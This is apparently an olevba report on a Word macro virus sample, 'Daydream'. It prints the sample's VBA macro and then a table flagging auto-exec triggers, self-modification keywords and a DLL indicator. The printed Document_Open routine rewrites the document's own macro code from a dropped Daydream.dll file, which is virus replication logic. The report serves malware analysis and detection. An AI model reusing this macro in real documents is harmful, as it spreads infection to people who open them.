olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Daydream-0835eb508408b577314ed9ee5950f8b2c81ab4ee
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Daydream-0835eb508408b577314ed9ee5950f8b2c81ab4ee 
in file: Virus.MSWord.Daydream-0835eb508408b577314ed9ee5950f8b2c81ab4ee - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
For x = 1 to ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
.DeleteLines 1
Next
End With
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromFile ("C:\WINDOWS\SYSTEM\Daydream.dll")
For x = 1 To ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Find("Private Sub Document_Close()", 1, 1, 1, 30, True, True, True) = False Then ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1
Next
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Daydream.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

